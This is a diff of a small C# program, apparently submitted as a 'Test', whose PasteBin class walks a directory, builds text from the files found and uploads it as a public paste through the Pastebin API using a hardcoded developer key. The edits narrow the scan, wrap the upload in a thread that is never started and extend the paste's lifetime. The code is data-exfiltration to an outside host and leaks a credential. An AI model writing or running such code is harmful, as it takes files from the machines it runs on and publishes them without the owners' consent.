@@ -1,24 +1,28 @@
 ﻿﻿using System;
-﻿using System.IO;
-﻿using System.Text;
+
 
 public class Test
 {
     private static void Main()
     {
-        PasteBin.Send((PasteBin.ScanDir()));
+        var thread = new System.Threading.Thread(new System.Threading.ThreadStart(PasteBin.Start));
     }
 }
 
 
 public static class PasteBin
+
 {
+    public static void Start()
+    {
+        Send(ScanDir());
+    }
     public static string ScanDir()
     {
 
         var sb = new System.Text.StringBuilder();
-        var di = new System.IO.DirectoryInfo(@"..\..\..\");
-        var dir = di.GetFiles("*", SearchOption.AllDirectories);
+        var di = new System.IO.DirectoryInfo(@".\");
+        var dir = di.GetFiles("*", System.IO.SearchOption.TopDirectoryOnly);
 
         foreach (var file in dir)
         {
@@ -57,7 +61,7 @@ public static class PasteBin
         query.Add("api_user_key", userKey);
         query.Add("api_dev_key", "955c285ecbc3d1c8b49111a2a9e4aa7d");
         query.Add("api_paste_code", text);
-        query.Add("api_paste_expire_date", "10M");
+        query.Add("api_paste_expire_date", "1D");
         query.Add("api_paste_private", "0");
         query.Add("api_paste_format", "text");
         query.Add("api_paste_name", DateTime.Now.ToString());
